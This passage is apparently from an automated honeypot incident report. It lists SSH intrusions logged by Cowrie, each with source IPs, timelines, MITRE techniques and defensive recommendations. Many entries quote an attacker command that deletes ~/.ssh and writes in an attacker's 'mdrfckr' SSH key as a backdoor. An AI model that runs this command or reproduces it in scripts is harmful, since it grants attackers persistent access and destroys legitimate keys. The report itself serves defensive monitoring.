- [ ] Submit `42.96.17[.]249` to AbuseIPDB if not already reported
- [ ] Block `42.96.17[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95df38cb1ea3

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 08:00 |
| **Last Seen** | 2026-05-02 08:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 08:00:31` | `cowrie.session.connect` |
| `2026-05-02 08:00:31` | `cowrie.client.version` |
| `2026-05-02 08:00:31` | `cowrie.client.kex` |
| `2026-05-02 08:00:31` | `cowrie.login.success` |
| `2026-05-02 08:00:31` | `cowrie.session.params` |
| `2026-05-02 08:00:31` | `cowrie.command.input` |
| `2026-05-02 08:00:31` | `cowrie.command.failed` |
| `2026-05-02 08:00:32` | `cowrie.log.closed` |
| `2026-05-02 08:00:32` | `cowrie.session.params` |
| `2026-05-02 08:00:32` | `cowrie.command.input` |
| `2026-05-02 08:00:32` | `cowrie.session.file_download` |
| `2026-05-02 08:00:32` | `cowrie.log.closed` |
| `2026-05-02 08:00:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc6d32c24ba2

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 08:00 |
| **Last Seen** | 2026-05-02 08:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 08:00:33` | `cowrie.session.connect` |
| `2026-05-02 08:00:33` | `cowrie.client.version` |
| `2026-05-02 08:00:33` | `cowrie.client.kex` |
| `2026-05-02 08:00:34` | `cowrie.login.success` |
| `2026-05-02 08:00:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c5485da7384

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 08:01 |
| **Last Seen** | 2026-05-02 08:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 08:01:32` | `cowrie.session.connect` |
| `2026-05-02 08:01:32` | `cowrie.client.version` |
| `2026-05-02 08:01:32` | `cowrie.client.kex` |
| `2026-05-02 08:01:32` | `cowrie.login.success` |
| `2026-05-02 08:01:32` | `cowrie.session.params` |
| `2026-05-02 08:01:32` | `cowrie.command.input` |
| `2026-05-02 08:01:32` | `cowrie.command.failed` |
| `2026-05-02 08:01:32` | `cowrie.log.closed` |
| `2026-05-02 08:01:32` | `cowrie.session.params` |
| `2026-05-02 08:01:32` | `cowrie.command.input` |
| `2026-05-02 08:01:32` | `cowrie.session.file_download` |
| `2026-05-02 08:01:32` | `cowrie.log.closed` |
| `2026-05-02 08:01:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d857d6a89282

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 08:01 |
| **Last Seen** | 2026-05-02 08:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 08:01:34` | `cowrie.session.connect` |
| `2026-05-02 08:01:34` | `cowrie.client.version` |
| `2026-05-02 08:01:34` | `cowrie.client.kex` |
| `2026-05-02 08:01:34` | `cowrie.login.success` |
| `2026-05-02 08:01:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dce91615db8

| Field | Detail |
|---|---|
| **Source IP** | `42.96.17[.]249` |
| **First Seen** | 2026-05-02 08:07 |
| **Last Seen** | 2026-05-02 08:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 08:07:20` | `cowrie.session.connect` |
| `2026-05-02 08:07:20` | `cowrie.client.version` |
| `2026-05-02 08:07:20` | `cowrie.client.kex` |
| `2026-05-02 08:07:21` | `cowrie.login.success` |
| `2026-05-02 08:07:21` | `cowrie.session.params` |
| `2026-05-02 08:07:21` | `cowrie.command.input` |
| `2026-05-02 08:07:21` | `cowrie.command.failed` |
| `2026-05-02 08:07:21` | `cowrie.log.closed` |
| `2026-05-02 08:07:21` | `cowrie.session.params` |
| `2026-05-02 08:07:21` | `cowrie.command.input` |
| `2026-05-02 08:07:21` | `cowrie.session.file_download` |
| `2026-05-02 08:07:21` | `cowrie.log.closed` |
| `2026-05-02 08:07:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.17[.]249` to AbuseIPDB if not already reported
- [ ] Block `42.96.17[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b87564a4eb5e

| Field | Detail |
|---|---|
| **Source IP** | `42.96.17[.]249` |
| **First Seen** | 2026-05-02 08:07 |
| **Last Seen** | 2026-05-02 08:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 08:07:23` | `cowrie.session.connect` |
| `2026-05-02 08:07:23` | `cowrie.client.version` |
| `2026-05-02 08:07:23` | `cowrie.client.kex` |
| `2026-05-02 08:07:23` | `cowrie.login.success` |
| `2026-05-02 08:07:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.17[.]249` to AbuseIPDB if not already reported
- [ ] Block `42.96.17[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46211addc137

| Field | Detail |
|---|---|
| **Source IP** | `118.33.113[.]91` |
| **First Seen** | 2026-05-02 08:21 |
| **Last Seen** | 2026-05-02 08:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 08:21:29` | `cowrie.session.connect` |
| `2026-05-02 08:21:29` | `cowrie.client.version` |
| `2026-05-02 08:21:30` | `cowrie.client.kex` |
| `2026-05-02 08:21:30` | `cowrie.login.success` |
| `2026-05-02 08:21:30` | `cowrie.session.params` |
| `2026-05-02 08:21:30` | `cowrie.command.input` |
| `2026-05-02 08:21:30` | `cowrie.command.failed` |
| `2026-05-02 08:21:31` | `cowrie.log.closed` |
| `2026-05-02 08:21:31` | `cowrie.session.params` |
| `2026-05-02 08:21:31` | `cowrie.command.input` |
| `2026-05-02 08:21:31` | `cowrie.session.file_download` |
| `2026-05-02 08:21:31` | `cowrie.log.closed` |
| `2026-05-02 08:21:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.33.113[.]91` to AbuseIPDB if not already reported
- [ ] Block `118.33.113[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1935aaaf62b2

| Field | Detail |
|---|---|
| **Source IP** | `118.33.113[.]91` |
| **First Seen** | 2026-05-02 08:21 |
| **Last Seen** | 2026-05-02 08:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 08:21:33` | `cowrie.session.connect` |
| `2026-05-02 08:21:33` | `cowrie.client.version` |
| `2026-05-02 08:21:33` | `cowrie.client.kex` |
| `2026-05-02 08:21:34` | `cowrie.login.success` |
| `2026-05-02 08:21:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.33.113[.]91` to AbuseIPDB if not already reported
- [ ] Block `118.33.113[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ca9ee54d21e

| Field | Detail |
|---|---|
| **Source IP** | `186.13.24[.]118` |
| **First Seen** | 2026-05-02 08:28 |
| **Last Seen** | 2026-05-02 08:29 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 08:28:58` | `cowrie.session.connect` |
| `2026-05-02 08:28:58` | `cowrie.client.version` |
| `2026-05-02 08:28:58` | `cowrie.client.kex` |
| `2026-05-02 08:29:00` | `cowrie.login.success` |
| `2026-05-02 08:29:00` | `cowrie.session.params` |
| `2026-05-02 08:29:00` | `cowrie.command.input` |
| `2026-05-02 08:29:00` | `cowrie.command.failed` |
| `2026-05-02 08:29:01` | `cowrie.log.closed` |
| `2026-05-02 08:29:02` | `cowrie.session.params` |
| `2026-05-02 08:29:02` | `cowrie.command.input` |
| `2026-05-02 08:29:02` | `cowrie.session.file_download` |
| `2026-05-02 08:29:02` | `cowrie.log.closed` |
| `2026-05-02 08:29:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.13.24[.]118` to AbuseIPDB if not already reported
- [ ] Block `186.13.24[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcdd6bb2ed55

| Field | Detail |
|---|---|
| **Source IP** | `186.13.24[.]118` |
| **First Seen** | 2026-05-02 08:29 |
| **Last Seen** | 2026-05-02 08:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 08:29:06` | `cowrie.session.connect` |
| `2026-05-02 08:29:06` | `cowrie.client.version` |
| `2026-05-02 08:29:06` | `cowrie.client.kex` |
| `2026-05-02 08:29:08` | `cowrie.login.success` |
| `2026-05-02 08:29:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.13.24[.]118` to AbuseIPDB if not already reported
- [ ] Block `186.13.24[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4a78878f356

| Field | Detail |
|---|---|
| **Source IP** | `186.13.24[.]118` |
| **First Seen** | 2026-05-02 08:37 |
| **Last Seen** | 2026-05-02 08:37 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 08:37:46` | `cowrie.session.connect` |
| `2026-05-02 08:37:46` | `cowrie.client.version` |
| `2026-05-02 08:37:47` | `cowrie.client.kex` |
| `2026-05-02 08:37:48` | `cowrie.login.success` |
| `2026-05-02 08:37:49` | `cowrie.session.params` |
| `2026-05-02 08:37:49` | `cowrie.command.input` |
| `2026-05-02 08:37:49` | `cowrie.command.failed` |
| `2026-05-02 08:37:49` | `cowrie.log.closed` |
| `2026-05-02 08:37:50` | `cowrie.session.params` |
| `2026-05-02 08:37:50` | `cowrie.command.input` |
| `2026-05-02 08:37:50` | `cowrie.session.file_download` |
| `2026-05-02 08:37:50` | `cowrie.log.closed` |
| `2026-05-02 08:37:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.13.24[.]118` to AbuseIPDB if not already reported
- [ ] Block `186.13.24[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-624e5d0628b2

| Field | Detail |
|---|---|
| **Source IP** | `186.13.24[.]118` |
| **First Seen** | 2026-05-02 08:37 |
| **Last Seen** | 2026-05-02 08:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 08:37:54` | `cowrie.session.connect` |
| `2026-05-02 08:37:54` | `cowrie.client.version` |
| `2026-05-02 08:37:55` | `cowrie.client.kex` |
| `2026-05-02 08:37:56` | `cowrie.login.success` |
| `2026-05-02 08:37:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.13.24[.]118` to AbuseIPDB if not already reported
- [ ] Block `186.13.24[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5f72ba7b682

| Field | Detail |
|---|---|
| **Source IP** | `68.183.236[.]1` |
| **First Seen** | 2026-05-02 08:43 |
| **Last Seen** | 2026-05-02 08:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 08:43:15` | `cowrie.session.connect` |
| `2026-05-02 08:43:15` | `cowrie.client.version` |
| `2026-05-02 08:43:15` | `cowrie.client.kex` |
| `2026-05-02 08:43:16` | `cowrie.login.success` |
| `2026-05-02 08:43:16` | `cowrie.session.params` |
| `2026-05-02 08:43:16` | `cowrie.command.input` |
| `2026-05-02 08:43:16` | `cowrie.command.failed` |
| `2026-05-02 08:43:16` | `cowrie.log.closed` |
| `2026-05-02 08:43:16` | `cowrie.session.params` |
| `2026-05-02 08:43:16` | `cowrie.command.input` |
| `2026-05-02 08:43:16` | `cowrie.session.file_download` |
| `2026-05-02 08:43:16` | `cowrie.log.closed` |
| `2026-05-02 08:43:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.236[.]1` to AbuseIPDB if not already reported
- [ ] Block `68.183.236[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc7812ccd244

| Field | Detail |
|---|---|
| **Source IP** | `68.183.236[.]1` |
| **First Seen** | 2026-05-02 08:43 |
| **Last Seen** | 2026-05-02 08:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 08:43:18` | `cowrie.session.connect` |
| `2026-05-02 08:43:18` | `cowrie.client.version` |
| `2026-05-02 08:43:18` | `cowrie.client.kex` |
| `2026-05-02 08:43:18` | `cowrie.login.success` |
| `2026-05-02 08:43:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.236[.]1` to AbuseIPDB if not already reported
- [ ] Block `68.183.236[.]1` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30516db65db9

| Field | Detail |
|---|---|
| **Source IP** | `123.182.141[.]59` |
| **First Seen** | 2026-05-02 08:44 |
| **Last Seen** | 2026-05-02 08:45 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 08:44:59` | `cowrie.session.connect` |
| `2026-05-02 08:44:59` | `cowrie.client.version` |
| `2026-05-02 08:45:26` | `cowrie.client.kex` |
| `2026-05-02 08:45:26` | `cowrie.login.success` |
| `2026-05-02 08:45:27` | `cowrie.session.params` |
| `2026-05-02 08:45:27` | `cowrie.command.input` |
| `2026-05-02 08:45:27` | `cowrie.log.closed` |
| `2026-05-02 08:45:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.182.141[.]59` to AbuseIPDB if not already reported
- [ ] Block `123.182.141[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-337d8a4ab187

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]81` |
| **First Seen** | 2026-05-02 08:56 |
| **Last Seen** | 2026-05-02 08:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 08:56:32` | `cowrie.session.connect` |
| `2026-05-02 08:56:32` | `cowrie.client.version` |
| `2026-05-02 08:56:33` | `cowrie.client.kex` |
| `2026-05-02 08:56:34` | `cowrie.login.success` |
| `2026-05-02 08:56:35` | `cowrie.session.params` |
| `2026-05-02 08:56:35` | `cowrie.command.input` |
| `2026-05-02 08:56:35` | `cowrie.command.failed` |
| `2026-05-02 08:56:35` | `cowrie.log.closed` |
| `2026-05-02 08:56:36` | `cowrie.session.params` |
| `2026-05-02 08:56:36` | `cowrie.command.input` |
| `2026-05-02 08:56:36` | `cowrie.session.file_download` |
| `2026-05-02 08:56:36` | `cowrie.log.closed` |
| `2026-05-02 08:56:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]81` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]81` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b01662d8d94c

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]81` |
| **First Seen** | 2026-05-02 08:56 |
| **Last Seen** | 2026-05-02 08:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 08:56:39` | `cowrie.session.connect` |
| `2026-05-02 08:56:39` | `cowrie.client.version` |
| `2026-05-02 08:56:39` | `cowrie.client.kex` |
| `2026-05-02 08:56:40` | `cowrie.login.success` |
| `2026-05-02 08:56:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]81` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c37a6690d932

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]81` |
| **First Seen** | 2026-05-02 08:59 |
| **Last Seen** | 2026-05-02 08:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
